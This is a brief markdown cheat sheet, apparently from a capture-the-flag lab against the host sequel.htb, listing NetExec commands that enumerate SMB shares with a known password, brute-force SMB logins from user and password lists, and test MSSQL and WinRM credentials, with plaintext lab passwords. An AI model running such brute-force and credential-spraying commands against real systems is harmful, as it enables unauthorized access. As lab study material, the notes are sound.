__tags: windows linux smb mssql


#### List all shares with username and password:
```bash
netexec smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares
```

#### Trying Differnt passwords and users for smb brute force
```bash
netexec smb 10.10.11.51 -u users.txt -p pass.txt
```

#### Test mysql login
```bash
nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth
```

#### Test WinRm login
```bash
nxc winrm sequel.htb -u Users.txt -p 'WqSZAF6CysDQbGb3'
```
